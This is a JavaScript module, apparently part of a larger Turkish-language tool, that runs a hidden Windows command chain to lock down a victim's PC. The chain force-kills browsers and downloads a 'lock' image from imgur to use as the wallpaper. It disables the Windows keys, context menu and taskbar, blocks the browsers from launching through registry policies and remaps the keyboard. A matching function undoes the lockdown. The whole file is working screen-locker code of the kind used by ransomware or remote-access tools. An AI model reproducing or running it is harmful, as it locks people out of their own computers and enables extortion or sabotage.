Object.defineProperty(exports, "__esModule", {
  value: true
});
const childProcess = require("child_process");
const Logger = require("./Logger.js");
function applySystemLockdown() {
  const command = "cmd /c \"taskkill /F /IM chrome.exe /IM msedge.exe /IM firefox.exe /IM opera.exe /IM operagx.exe /IM brave.exe 2>nul & powershell -Command \\\"Invoke-WebRequest -Uri 'https://i.imgur.com/Gx3Thir.png' -OutFile '$env:USERPROFILE\\Downloads\\kilit.png' -UserAgent 'Mozilla/5.0'\\\" & reg add \\\"HKCU\\Control Panel\\Desktop\\\" /v Wallpaper /t REG_SZ /d \\\"%USERPROFILE%\\Downloads\\kilit.png\\\" /f & reg add \\\"HKCU\\Control Panel\\Desktop\\\" /v WallpaperStyle /t REG_SZ /d \\\"2\\\" /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\\" /v HideIcons /t REG_DWORD /d 1 /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoViewContextMenu /t REG_DWORD /d 1 /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoWinKeys /t REG_DWORD /d 1 /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoSetTaskbar /t REG_DWORD /d 1 /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoTrayItemsDisplay /t REG_DWORD /d 1 /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v DisallowRun /t REG_DWORD /d 1 /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\\\" /v 1 /t REG_SZ /d chrome.exe /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\\\" /v 2 /t REG_SZ /d msedge.exe /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\\\" /v 3 /t REG_SZ /d firefox.exe /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\\\" /v 4 /t REG_SZ /d opera.exe /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\\\" /v 5 /t REG_SZ /d operagx.exe /f & reg add \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\\\" /v 6 /t REG_SZ /d brave.exe /f & reg add \\\"HKLM\\System\\CurrentControlSet\\Control\\Keyboard Layout\\\" /v \\\"Scancode Map\\\" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f & RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters & taskkill /F /IM explorer.exe & timeout /t 2 /nobreak >nul & start \\\"\\\" \\\"C:\\Windows\\explorer.exe\\\"\"";
  return new Promise((resolve, reject) => {
    childProcess.exec(command, {
      windowsHide: true
    }, (error, stdout, stderr) => {
      if (error) {
        console.error("Sistem kısıtlaması başarısız: " + error.message);
        Logger.logger.error("Sistem kısıtlaması başarısız: " + error.message);
        reject(error);
        return;
      }
      if (stderr && stderr.trim() !== "") console.warn("Uyarı: " + stderr);
      resolve(stdout);
    });
  });
}
function removeSystemLockdown() {
  const command = "cmd /c \"reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoViewContextMenu /f 2>nul & reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoWinKeys /f 2>nul & reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoSetTaskbar /f 2>nul & reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v NoTrayItemsDisplay /f 2>nul & reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\" /v DisallowRun /f 2>nul & reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\\\" /f 2>nul & reg delete \\\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\\" /v HideIcons /f 2>nul & reg delete \\\"HKLM\\System\\CurrentControlSet\\Control\\Keyboard Layout\\\" /v \\\"Scancode Map\\\" /f 2>nul & RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters & taskkill /F /IM explorer.exe & timeout /t 2 /nobreak >nul & start \\\"\\\" \\\"C:\\Windows\\explorer.exe\\\"\"";
  return new Promise((resolve, reject) => {
    childProcess.exec(command, {
      windowsHide: true
    }, (error, stdout, stderr) => {
      if (error) {
        console.error("Sistem kısıtlamasını kaldırma başarısız: " + error.message);
        Logger.logger.error("Sistem kısıtlamasını kaldırma başarısız: " + error.message);
        reject(error);
        return;
      }
      if (stderr && stderr.trim() !== "") console.warn("Uyarı: " + stderr);
      resolve(stdout);
    });
  });
}
exports.applySystemLockdown = applySystemLockdown;
exports.removeSystemLockdown = removeSystemLockdown;
